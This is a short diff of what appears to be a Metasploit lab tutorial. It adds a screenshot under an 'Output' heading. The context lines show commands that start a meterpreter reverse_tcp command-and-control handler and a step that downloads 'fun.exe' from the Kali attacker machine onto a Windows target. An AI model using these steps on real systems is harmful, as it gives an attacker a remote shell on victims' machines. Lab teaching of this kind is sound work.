@@ -91,6 +91,7 @@ Type help or a question mark "?" to see the list of all available commands you c
 Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
 
 ### Output 
+<img width="540" height="146" alt="image" src="https://github.com/user-attachments/assets/e8e54096-62cb-46eb-b4b3-e38541597833" />
 
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
